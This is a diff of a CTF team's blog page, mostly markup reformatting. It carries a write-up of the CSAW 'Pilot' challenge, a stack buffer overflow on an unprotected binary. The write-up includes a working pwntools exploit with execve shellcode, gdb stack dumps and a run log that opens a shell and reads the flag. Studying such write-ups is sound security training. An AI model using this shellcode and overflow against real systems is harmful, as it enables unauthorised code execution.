@@ -1,19 +1,19 @@
 <!DOCTYPE html>
-<html lang=en>
-<head>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
-  <meta http-equiv="Cache-Control" content="no-transform" />
-  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="apple-mobile-web-app-status-bar-style" content="black">
   <meta name="format-detection" content="telephone=no,email=no,adress=no">
   <!-- Color theme for statusbar -->
-  <meta name="theme-color" content="#000000" />
+  <meta name="theme-color" content="#000000">
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
-  <meta http-equiv="window-target" content="_top" />
+  <meta http-equiv="window-target" content="_top">
   
   <title>[Pwn] CSAW - Pilot | TeamRocketIST - Portuguese CTF Team</title>
   <meta name="description" content="pilotCan I take your order?nc pwn.chal.csaw.io 846416:05 Eastern: Updated binary  Simple bufferoverflow , we actually have a read size of 0x40 stack the binary doesn’t have any kind of protections so">
@@ -44,7 +44,7 @@
 
   <link rel="stylesheet" href="/css/style.css">
 </head>
-
+</html>
 
 <body class="main-center">
   <section class="mainside">
@@ -65,7 +65,7 @@
 
     <form class="search-form sidebar-form">
         <div class="input-group">
-            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <input type="text" class="search-form-input form-control" placeholder="Search">
             <span class="input-group-btn">
                 <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
             </span>
@@ -75,7 +75,7 @@
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech="">
             <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
             <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
         </div>
@@ -162,11 +162,11 @@
 	
     <ul class="social-links">
     	
-        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="fa fa-github"></i></a></li>
         
-        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle="tooltip" data-placement="top"><i class="fa fa-twitter"></i></a></li>
         
-        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="fa fa-rss"></i></a></li>
         
     </ul>
     
@@ -331,7 +331,7 @@
   
   <section class="main">
   <div class="content">
-  <article id="post-Pwn-CSAW-Pilot" class="article article-type-post" itemscope itemprop="blogPost">
+  <article id="post-Pwn-CSAW-Pilot" class="article article-type-post" itemscope="" itemprop="blogPost">
     
     <header class="article-header">
       
@@ -370,7 +370,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 300 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 354 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 2 (min)</span>
@@ -385,15 +385,15 @@
 <p>Simple bufferoverflow , we actually have a read size of <code>0x40</code> stack the binary doesn’t have any kind of protections so it’s a very easy one, just a simple buffer overflow, we even get the buffer address to jump!</p>
 <p><img src="https://i.imgur.com/fA4rP6S.png" alt=""></p>
 <p>The plan is:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 - Caculate the offset to overflow.</div><div class="line">2 - Extract the address of the buffer.</div><div class="line">3 - Insert nops at the beginning and then shell code, the rest of the buffer fill it with A or any other values</div><div class="line">4 - Modify the return address with the value of the beginning of the buffer</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 - Caculate the offset to overflow.</span><br><span class="line">2 - Extract the address of the buffer.</span><br><span class="line">3 - Insert nops at the beginning and then shell code, the rest of the buffer fill it with A or any other values</span><br><span class="line">4 - Modify the return address with the value of the beginning of the buffer</span><br></pre></td></tr></table></figure>
 <p>Visual representation of the stack!</p>
 <p><img src="https://i.imgur.com/sXg37RZ.png" alt=""></p>
 <p>How the stack looks like in gdb!</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/20g 0x7ffef1913660</div><div class="line">0x7ffef1913660:	0xbf48f63190909090	0xff978cd091969dd1  </div><div class="line">0x7ffef1913670:	0x573b04e6f7dff748	0x41414141050f5f54  </div><div class="line">0x7ffef1913680:	0x4141414141414141	0x00007ffef1913660</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20g 0x7ffef1913660</span><br><span class="line">0x7ffef1913660:	0xbf48f63190909090	0xff978cd091969dd1  </span><br><span class="line">0x7ffef1913670:	0x573b04e6f7dff748	0x41414141050f5f54  </span><br><span class="line">0x7ffef1913680:	0x4141414141414141	0x00007ffef1913660</span><br></pre></td></tr></table></figure>
 <p>The offset is 40 bytes to overflow the code is very simple</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'pwn/pilot'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">8464</span>)</div><div class="line"> </div><div class="line">binary = ELF(<span class="string">'pwn/pilot'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"><span class="comment">#db.attach(r, '''</span></div><div class="line"><span class="comment">#break *0x0000000000400b35</span></div><div class="line"><span class="comment">#c''')</span></div><div class="line">r.recvuntil(<span class="string">'[*]Good Luck Pilot!....\n'</span>)</div><div class="line"></div><div class="line">nops = <span class="string">'\x90'</span>*<span class="number">4</span></div><div class="line">shellcode =  <span class="string">"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"</span></div><div class="line">padding = <span class="string">'A'</span>* (<span class="number">40</span> - len(nops)- len(shellcode)) </div><div class="line">BUFFER = int(r.recvline()[<span class="number">12</span>:],<span class="number">0</span>)</div><div class="line">log.info(<span class="string">"LEAKED BUFFER 0x%x"</span> % BUFFER)</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'[*]Command:'</span>)</div><div class="line">r.sendline(nops+ shellcode + padding+ p64(BUFFER))</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(<span class="string">'pwn/pilot'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">8464</span>)</span><br><span class="line"> </span><br><span class="line">binary = ELF(<span class="string">'pwn/pilot'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="keyword">False</span></span><br><span class="line">r = getConn()</span><br><span class="line"><span class="comment">#db.attach(r, '''</span></span><br><span class="line"><span class="comment">#break *0x0000000000400b35</span></span><br><span class="line"><span class="comment">#c''')</span></span><br><span class="line">r.recvuntil(<span class="string">'[*]Good Luck Pilot!....\n'</span>)</span><br><span class="line"></span><br><span class="line">nops = <span class="string">'\x90'</span>*<span class="number">4</span></span><br><span class="line">shellcode =  <span class="string">"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"</span></span><br><span class="line">padding = <span class="string">'A'</span>* (<span class="number">40</span> - len(nops)- len(shellcode)) </span><br><span class="line">BUFFER = int(r.recvline()[<span class="number">12</span>:],<span class="number">0</span>)</span><br><span class="line">log.info(<span class="string">"LEAKED BUFFER 0x%x"</span> % BUFFER)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'[*]Command:'</span>)</span><br><span class="line">r.sendline(nops+ shellcode + padding+ p64(BUFFER))</span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
 <p>Running it</p>
-<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ python pilot.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</div><div class="line">[*] LEAKED BUFFER 0x7ffc2562d050</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pilot</div><div class="line">$ cat flag</div><div class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python pilot.py</span><br><span class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</span><br><span class="line">[*] LEAKED BUFFER 0x7ffc2562d050</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line">pilot</span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</span><br></pre></td></tr></table></figure>
       
     </div>
     <footer class="article-footer">
@@ -458,7 +458,7 @@
   
 </div>
 
-  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <nav class="bar bar-footer clearfix" data-stick-bottom="">
   
   <ul class="pager pull-left">
     
